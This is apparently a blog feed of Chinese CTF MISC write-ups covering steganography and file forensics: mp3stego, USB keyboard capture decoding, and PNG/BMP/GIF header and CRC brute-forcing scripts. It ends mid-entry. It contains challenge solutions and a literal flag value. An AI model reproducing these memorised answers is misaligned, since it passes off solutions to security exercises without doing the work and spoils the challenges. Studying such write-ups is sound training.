f6f779e9275e03072a59eef75d3599d337ae5641d024bf9a2e03f7cf6a63a925e2a93e264b802ffc9fa1baa20c32bd0a7fc06a60021273329329630874b35eb1b6bd1ba2ab5f163bd29cbd8c37806ab2c7f71189d1504ef9a2a438b6bfcf8650ca09cf60beb0694342e849c76b3f8639cbec6a37b33a52a7a9fd0a6b88f404c732891cba77555f32f8c760d8079128af09c210a809f127a1e6e99bbbf9a05e65bb51454aa7c28ed52648a0c774149ddcb5300b155fc29a64c746059b0b39fcc67ece0c74a5c3218379cf240c7dff7db396f33898378d856e2ca9b4987a05693f85bc02cdf5fe08669316f85d1507bbb11300b5a6709249463fa82122bd6f261ecf547ffa392c78d62aea2a3bee23c9e4918a65d82de0d37e535e5977cca28d7c08fa8e3a8547e723d49ef3082018d73e18e8d6174be434d4f24f74ba2dfdcc34b435a3c37b723fc13c896296ca10aa742a8dbc411e5199753b7137945adcdc66fcf14520f60a53c6e3cfcaf11f8a5b0bb33175ae79a2c5bd6acff68b429b1f2aee17c661633bfb0472e3f51c2c1ef3c2e8a1b56dc5f72a1c89f27003a19547a8e4d00c0250478938e3b674aa62b77b890ea35db22a1f543f99dc4183fdd8a9b102194e7492be3ab78dd881fe7828bd431835872157e980259932b9ff024bfbc26339ec7535c3564f6a89493dd0d283ff081a41841cf22af16719231a9e9cf070a1a5b6fd165e54119c7e98fca1268aeb68e0a2236c61a100065a288a161dddb869d3672673eeea3850737d1e74adc4a400e87921cb63f40ad231c63f71db21b8966440cc51871227a2622fa4c02bf10f5d1b2ef68a49bffaf311228a0f098a29a15f8d25239955e5225712a88ccb4b2ab479680073c82fed3b2c237f0e0de28d08364cffb739ac46aa230c4b42e0e928f638eb26a545604a661bf91cb74353f40c07520937a49491738d6bf6c478345ba965b90f3aade1a9987f39a91ae04e2b22c8a6b66b7c838a3f87f890d8cc00a469cd5869a3405242e55d9731cc0c466791fcc7bd5ce996363f2c10a5ea3e07c8b8e2af35e8aa4e3fe1e3facb33ee47fe282a1a8bb7134ff0c0205d37758e22445eab0c7b1d72a4ddfdb29ecb112cd0175a5437b400213662841e37ef7288ddcfef831de0026ce157fd94597dca3c5785ed8aace9304c54fae304b7bdc976b0a5f095b0a50558b0f79f6c538e113002709f29262cbb33f85ff74a9804ef5b1ef404bc84f639f1e96c45ea1d9d5ccc2c98c08c85cedd3cfc4811177b42877c72b3795ebecff7bad04ff25470991f663a7d568c6c8f27ab8f787e274c7c1ee482f920b1c3ff962f663c46e6444d4291b3e962a3fe93b2436fbc6a15d0d46aca4df7a5567f5de00e47a48319584ab089dfefcf97ca8287c0b9b3c16c694d524edce1a3307ebacfcef6c5a8a871cf8583f6e8e45a23b039513c46bfe636aa914b634e6b44348d9f0b9caa3a05cd93fe4d8732feea2ecf4a9a3682982a459f7530f36bbb434d2545da4218d24793781cd19c16eebffbfbde73cc187654effeb0e6df0163de6caad44216676df966422923008feb227634100dd2def1c6e2272e3903b27a7acd3e35be9407ec539189004208682896d80035a25bea3ad46a7863960928781e72bd57963a5634a2acd71f856a0c3b5a1d760658c76495c7f428a317837feb811c7b0efe5b0c12faf121c9c255ab0848d0ec70f26b8e8f2bf999f27a7c30cdd595ac208753f23c6a15e59fc72a05f79a70df744ae60defd39079fd2f37d668afa61e8ea5f1e465c162a6b5c07c0d2be5d893c92692df910e9d7097af63b7dc9a4b2b391fc15f203d5966d2334755371f07a0b19c4d667a27de75c87241e984b7c5c2e16f2d56dd113f95e284d83f6f28d330e8cf9b84ee5ac70acae1755eba72ba8fa59f4b4d6b6110bc00d8f44b04eda90b224147ae4e565dc5bba5fc1a8a0f98ff09881370270aaa46af80f21dde09943ca5569fa95de8ebdd2a71c9d50812ce9dff5a0fa4d49cecd8208ba88dabbaffce507e83ec6353e8c9bd89eba21698e698c56e65954a2b478667c7e548b1f1a0dfe7324d9a8363ce2990f73da78c08e009e15dc8a19786baccb0b336fe2a3d2b2546b6a0478cbe47c23545f1b2ec2a7d96acd3572f6d5cea05d69e74c8dcf64ee86fcd819c4b362523b502c5f87a08d3981bbee14021acae8a0a065e6953c320336e6c8b00a40b36416486ba31364c58bcd4ef856c5a7743040f40070110064d207ab9b660a8e61f0aa812ab98967f4930f68bbeb223e3cba9d2c18920ae37e95f40ff2a237c04841e5b094edc1be98775aa2aa1aab5703b536db327bd86ff81f390c7a2fa5536b91b24999eac13cf2894de85e16e89610ae994fb7fb2dc34565dfa9a5a323d13fdaf8df8cb9f71b30a3bafe798401e015f492f2b6bb9b4169c57189b978b777f28776881ed37eed476b4e74a9b22d82b7486b305f8cafd1fa2f9b579ad53962e3c5913a228d3468fbcef43023531764db211c53d5916a733c8118ec04e40455fcdb8208d325b1930d42130cd6e8f093251eaa8ec8f6e306e27b360212dc30caec12827abb73292800e09f228ca5ce368fa553167ac69a306913137e18057344021fe1e0533e7899d45903ed8b86e49e17e5e3303d81ce0644c42882628d758785be4df2a4e48bea7629d8ad791f634daab17cd19c204a586adf7039ebca7c6810e2f1d9c9e4d1fc166f1dadd022cb85d9cc0b70bdf0834b054da8cad6e3126f4cb63c6028c1ceac47b85fc8faf61b4523bee9e6a8666b03dc14d8e50f2a54753e706c474df01dcec4958e1ca1afee11af566a6238627549eccaf6cfbd2066e973f335a7222361dd5d586e54df0ab5dd5ecbd81078226a4d04d20d4ef0826b71a64c17905b9a1ffdbcaffa3e88d3c00416749e8945c2429e1a7ef05d12a760b75b9e54933e16508a4ef6ef5623beae1648714a19235a263326f5eefccb48b5d6c234afdfe27465fa5997fc443752848cd2b177378a1c41093364ea2b28f9347216ec4ef89b91c3b835575361701e1107420477904c811ce87df71d04beda4c7aded4892067ff05160e5ffb4530c812f7d86e3af3baa253a393bd750e643c6c824a1d3804aade4d93a7413f05e52102fb2751f4c0845fca34a1d8159098b8d6339d9d7c5fe2c06d639fb561429c56c274a6c015cd00662e5f207b3753fea0dbc0edc60522b679236af83a03e90022a97f713d8d8fd79c5b7e38593faaf895acdb1c4408924ddc9ce463b9872acf72301c040b2b9090692d9bcc732da8a0d22f7644b5ffdce98f81baa90532a2c02caba6344358ab2a6fd12e809085a11d7cbdaabb8daab1e0f4ee4aa3692b6abc8b875fbf3b24609317d60dc60c7801497f622f09b92d6cdcd973a6315cb7ffa2acfe9006e2ecc79b173354e226f1be1f1ab57df97ecde67ca095971eb6c87bce57491b00a779dc22ee22f13c290e73d9e789e049260e39f39ccf3654e970a357987e383efa45fad439eaeb1c8c96271e341be9a43fc03f5a00225f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021第五届蓝帽杯初赛</title>
    <link href="http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>http://mklkx.github.io/2021/05/04/2021%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2021-05-04T02:29:08.000Z</published>
    <updated>2021-05-04T11:39:55.631Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021第五届蓝帽杯初赛">2021第五届蓝帽杯初赛</span></h3><hr><h4><span id="冬奥会_is_coming">冬奥会_is_coming</span></h4><p>mp3考虑mp3stego，这一步的密钥是冬奥会开始日期（八位数字）</p><p>用python,print出来后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>找到网站https://wingdingstranslator.com/</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>找到对应的github</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>用notepad++打开</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>发现密钥mp3</p><p>发现cipher字样：<a class="link" href="https://www.ifreesite.com/unicode/">https://www.ifreesite.com/unicode/<i class="fas fa-external-link-alt"></i></a></p><p>得到表情</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>参考这篇博客</p><p><a class="link" href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/<i class="fas fa-external-link-alt"></i></a></p><p>得到带密钥的emoji表情解密网站</p><p><a class="link" href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/<i class="fas fa-external-link-alt"></i></a></p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><h5><span id="flage32f619b-dbcd-49bd-9126-5d841aa01767"><strong>flag{e32f619b-dbcd-49bd-9126-5d841aa01767}</strong></span></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021第五届蓝帽杯初赛&quot;&gt;2021第五届蓝帽杯初赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;冬奥会_is_coming&quot;&gt;冬奥会_is_coming&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;mp3考虑mp3stego，这一步的密钥是冬奥会</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-0</title>
    <link href="http://mklkx.github.io/2021/04/30/MISC-data-0/"/>
    <id>http://mklkx.github.io/2021/04/30/MISC-data-0/</id>
    <published>2021-04-30T12:09:36.000Z</published>
    <updated>2021-05-21T08:54:59.208Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="data0">DATA[0]</span></h1><hr><h3><span id="1usb流量分析">1：USB流量分析</span></h3><h4><span id="usbkeyboarddatahacker">UsbKeyboardDataHacker</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r .&#x2F;example.pcap -T fields -e usb.capdata</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python UsbKeyboardDataHacker.py .&#x2F;example.pcap </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">usb_codes &#x3D; &#123;</span><br><span class="line">    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,</span><br><span class="line">    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,</span><br><span class="line">    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,</span><br><span class="line">    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,</span><br><span class="line">    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,</span><br><span class="line">    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,</span><br><span class="line">    0x29: &quot;*&quot;,# &lt;ESC&gt;</span><br><span class="line">    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,</span><br><span class="line">    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,</span><br><span class="line">    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,</span><br><span class="line">    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,</span><br><span class="line">    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():</span><br><span class="line">    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]</span><br><span class="line">    # print(x[4:6])</span><br><span class="line">    if code &#x3D;&#x3D; 0:</span><br><span class="line">        continue</span><br><span class="line">    if code &#x3D;&#x3D; 0x28:</span><br><span class="line">        print(&#39;ENTER!&#39;)</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; &#39;&#39;</span><br><span class="line">        continue</span><br><span class="line">    upper &#x3D; 0</span><br><span class="line">    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:</span><br><span class="line">        upper &#x3D; 1</span><br><span class="line">    data +&#x3D; usb_codes[code][upper]</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述脚本与常规不同之处在于<strong>0x29: “*”,# <esc></esc></strong>,对0x29进行了处理，暂且用*代替</p><p>为解决题目中模拟vim编辑的情况。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;data0&quot;&gt;DATA[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;1usb流量分析&quot;&gt;1：USB流量分析&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;usbkeyboarddatahacker&quot;&gt;UsbKeyboard</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>F5杯</title>
    <link href="http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/04/24/F5%E6%9D%AF/</id>
    <published>2021-04-24T02:24:46.000Z</published>
    <updated>2021-05-04T11:39:52.577Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ctfshow-f5杯">ctfshow-F5杯</span></h1><hr><h2><span id="1取idatihdr部分重新排列">1：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><h3><span id="just-another-拼图">Just Another 拼图</span></h3><blockquote><p>史上最简单的拼图misc题！贴心到连序号都已经全部标注好，令gaps彻底失业、眼科医院纷纷倒闭！唯一的问题是图里好像没有flag？这点小问题应该无关紧要吧。</p><p>感谢@出题人说不要署名 师傅供题。</p><blockquote><p>strings *.jpg | grep IDAT</p></blockquote></blockquote><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1"></p><h2><span id="2数列问题">2：数列问题</span></h2><h3><span id="填字游戏">填字游戏</span></h3><blockquote><p>这什么鬼填字游戏啊，到底要填什么字啊。</p><p>感谢@出题人说这次匿名 师傅供题</p><blockquote><p><a class="link" href="http://oeis.org/">http://oeis.org/<i class="fas fa-external-link-alt"></i></a></p></blockquote></blockquote><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2"></p><p>通过搜索找到对应数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">65 69 97 53 121 70 108 52 103</span><br><span class="line"># AEa5yFl4g</span><br></pre></td></tr></table></figure><h2><span id="3">3</span></h2><blockquote><p>两行代码一纸情书</p><blockquote><p>A very simple dll, I promise you can get flag in seconds</p><p>感谢@Y4tacker师傅供题</p></blockquote></blockquote><p>搜索ctf得到一大串字符串</p><p>一把梭后发现base64末尾出现‘==’</p><p>连续解码后得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ctfshow-f5杯&quot;&gt;ctfshow-F5杯&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;1取idatihdr部分重新排列&quot;&gt;1：取IDAT,IHDR部分重新排列&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;1）IHDR领先&lt;/p&gt;
&lt;p&gt;2）</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-image-0</title>
    <link href="http://mklkx.github.io/2021/04/21/MISC-image-0/"/>
    <id>http://mklkx.github.io/2021/04/21/MISC-image-0/</id>
    <published>2021-04-21T01:43:15.000Z</published>
    <updated>2021-04-25T13:43:27.673Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="image0">image[0]</span></h1><hr><p>一张图片的百种姿势</p><h2><span id="1bpg">1：bpg</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具：bpg-0.9.8-win64</span><br><span class="line"></span><br><span class="line">命令：bpgdec -o out.png misc3.bpg</span><br></pre></td></tr></table></figure><h2><span id="2idat块异常">2：IDAT块异常</span></h2><p><img lazyload src="/images/loading.svg" data-src="2-1.png" alt="2-1"></p><p>IDAT未满65524就有下一个数据块了，说明有问题</p><p>delete后得到</p><p><img lazyload src="/images/loading.svg" data-src="2-2.png" alt="2-2"></p><h2><span id="3idat长度转ascii">3：IDAT长度转ASCII</span></h2><h2><span id="4pngdebugger校验crc32">4：pngdebugger校验crc32</span></h2><p>错误的crc-code串联转ascii</p><p>CRC OK!   ===》   1</p><p>CRC FAILED   ===》   0</p><h2><span id="5image爆破长宽">5：image爆破长宽</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">for i in range(4096):</span><br><span class="line">    for j in range(4096):</span><br><span class="line">        c &#x3D; bytes.fromhex(&#39;4948445200000384000000960802000000&#39;)# IHDR</span><br><span class="line">        ihdr &#x3D; c[:4]+struct.pack(&#39;&gt;i&#39;,i)+struct.pack(&#39;&gt;i&#39;,j)+c[12:]</span><br><span class="line">        crc &#x3D; 0x5255A798# CRC32</span><br><span class="line">        if zlib.crc32(ihdr) &#x3D;&#x3D; crc:</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            exit(0)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="3-1.png" alt="3-1"></p><h2><span id="6png爆破高度">6：png爆破高度</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = <span class="built_in">open</span>(<span class="string">&quot;misc26.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破宽</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">20</span>:<span class="number">29</span>]  <span class="comment">#IHDR数据</span></span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>: <span class="comment">#IHDR块的crc32值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;weight&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破高</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xEC9CCBC6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;height&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;hex:&quot;</span>+<span class="built_in">hex</span>(i))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">#height</span></span><br><span class="line"><span class="comment">#606</span></span><br><span class="line"><span class="comment">#hex:0x25e</span></span><br></pre></td></tr></table></figure><h2><span id="7bmp修改高度">7：bmp修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="4-1.png" alt="4-1"></p><p><img lazyload src="/images/loading.svg" data-src="4-2.png" alt="4-2"></p><p>12-15：4字节的biWidth，这里是0x00000280，即十进制的640，用像素表示图像的宽度，查看文件信息验证正确；16-19：4字节的biHeight，这里是0x000001E0，即十进制的480，用像素表示图像的高度，查看文件信息验证正确；同时，这是一个正数，表示图像是倒立的，即图像数据是从左下角到右上角排列的；</p><h2><span id="8jpg修改高度">8：jpg修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="5-1.png" alt="5-1"></p><h2><span id="9gif修改高度">9：gif修改高度</span></h2><p><img lazyload src="/images/loading.svg" data-src="6-1.png" alt="6-1"></p><p>后分离帧得到flag</p><h2><span id="10bmp爆破宽度">10：bmp爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">f &#x3D; open(&#39;misc31.bmp&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[18:22]</span><br><span class="line">height &#x3D; c[22:26]</span><br><span class="line"># 爆破bmp宽度</span><br><span class="line">for i in range(900,1100):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.bmp&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:18]+struct.pack(&#39;&gt;i&#39;,i)[::-1]+c[22:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="11png爆破宽度">11：png爆破宽度</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">#爆破png宽度</span><br><span class="line">f &#x3D; open(r&#39;misc34.png&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[16:20]</span><br><span class="line">height &#x3D; c[20:24]</span><br><span class="line">for i in range(900,1200):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.png&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:16]+struct.pack(&#39;&gt;i&#39;,i)+c[20:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2><span id="12遇到binwalk有东西但分离不出的情况">12：遇到binwalk有东西，但分离不出的情况</span></h2><p><img lazyload src="/images/loading.svg" data-src="11-1.png" alt="11-1"></p><p>根据binwalk提示，尝试手动分离</p><h2><span id="13zsteg">13：zsteg</span></h2><p>首先尝试binwalk -e</p><p>发现bzip2</p><p><img lazyload src="/images/loading.svg" data-src="12-1.png" alt="12-1"></p><p>进一步binwalk却始终存在问题</p><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg misc17.png</span><br></pre></td></tr></table></figure><p>得到应该分离的数据段</p><p><img lazyload src="/images/loading.svg" data-src="12-2.png" alt="12-2"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -e &quot;extradata:0&quot; &#x2F;root&#x2F;桌面&#x2F;misc17.png &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.txt</span><br></pre></td></tr></table></figure><h2><span id="14exiftool查看附加信息">14：exiftool查看附加信息</span></h2><h2><span id="15gif考虑时间间隔3637gtgt01">15：gif考虑时间间隔/3637&gt;&gt;01</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">identify -format &quot;%T&quot; misc39.gif &gt; 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">text&#x3D;&#39;737363636373737373736373636373736363737363737373636373737373637363636373736373737373737373637373737373737363737363737363736373637373636373636373737363636363737363636373637373636373637373636373736373736363737363637373736363736373737363637363737363736373737363637373637373636363736363737363737373737363636373637373636373637363737363637363637373637373636373737363636373736363736363637373736363736373736373736363737363637373737363636363736373737363637373736363736373737363636373637373636363737373736363636373637373636363636373736373636363737363736373637373736363737373737373637&#39;.split(&#39;3&#39;)</span><br><span class="line">print(text)</span><br><span class="line">firstType &#x3D; &#39;6&#39;</span><br><span class="line">secondType &#x3D; &#39;7&#39;</span><br><span class="line">binaryString &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in text: #Foreach char</span><br><span class="line">    if char &#x3D;&#x3D; firstType: #Check if it is the first type</span><br><span class="line">        binaryString +&#x3D; &#39;0&#39; #Mark it as 0</span><br><span class="line">        # print(char)</span><br><span class="line">    else:</span><br><span class="line">        binaryString +&#x3D; &#39;1&#39; #Mark it as 1</span><br><span class="line">        # print(char)</span><br><span class="line"></span><br><span class="line">print(binaryString) #Print result</span><br><span class="line">print((len(binaryString)-1)&#x2F;7)</span><br><span class="line"></span><br><span class="line">binary&#x3D;&#39;&#39;</span><br><span class="line">for i in range(41):</span><br><span class="line">    binary +&#x3D; binaryString[7*i:7*i+7] + &#39; &#39;</span><br><span class="line">print(binary)</span><br><span class="line">#1100011 1110100 1100110 1110011 1101000 1101111 1110111 1111011 0110101 0110010 0111000 0110001 0110010 1100110 1100110 0111001 0111001 0110101 1100110 1100010 0110111 1100010 1100101 0110010 0110110 0111000 1100100 0111001 0110110 0110011 1100001 0111001 1100101 1100010 1100011 1100001 0110000 0110100 0110101 0111001 1111101 </span><br></pre></td></tr></table></figure><h2><span id="16lsb改变通道改变排序方式">16：LSB改变通道，改变排序方式</span></h2><h2><span id="17base">17：base</span></h2><h2><span id="18取idatihdr部分重新排列">18：取IDAT,IHDR部分重新排列</span></h2><p>1）IHDR领先</p><p>2）IDAT尝试重新排列</p><p>3）前后补全</p><p>&lt;F5杯《Just Another 拼图》&gt;</p><h1><span id="脑洞部分">脑洞部分</span></h1><h2><span id="1010按位取">1：010按位取</span></h2><p><img lazyload src="/images/loading.svg" data-src="1-1.png" alt="1-1"></p><h2><span id="2所有头的hex都该熟悉各种hex魔转">2：所有头的hex都该熟悉,各种hex魔转</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Serial Number                   : 686578285826597329</span><br></pre></td></tr></table></figure><p>686578285826597329=》hex(X&amp;Ys)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X Resolution                    : 3902939465</span><br><span class="line">Y Resolution                    : 2371618619</span><br><span class="line">X Position                      : 1082452817</span><br><span class="line">Y Position                      : 2980145261</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(hex(x))</span><br><span class="line">0xe8a22149</span><br><span class="line">&gt;&gt;&gt; print(hex(y))</span><br><span class="line">0x8d5c073b</span><br><span class="line">&gt;&gt;&gt; print(hex(a))</span><br><span class="line">0x4084eb51</span><br><span 